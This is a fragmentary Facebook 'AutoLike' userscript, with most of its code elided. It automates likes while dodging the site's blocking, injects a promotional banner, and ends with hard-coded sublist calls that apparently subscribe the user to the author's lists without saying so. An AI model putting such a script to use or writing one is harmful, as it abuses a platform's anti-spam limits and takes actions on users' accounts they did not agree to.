...
// @description		        *[ AUTOLIKE ]* AutoLike Facebook coded by pekkeyz network. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			http://www.facebook.com/pekkeyz
// @authorURL		        
 ...
 unsafeWindow.Anonymous69 = function()
 {
  ...
  function A()
  {
   ...
   for(var L=0;L<M.length;L++)
   {
    ...
    {
     alert("teu nanaon jang nyantai weh");
     N=true
    }
   }
   if(!N)
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/notes/mochamad-mulki-ilmansyah/emotion/545040535538258' target='_blank' title='NEW' ><blink><center>NEW FACEBOOK</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("416673058389743");
sublist("147163472022001");
sublist("433409986675892");
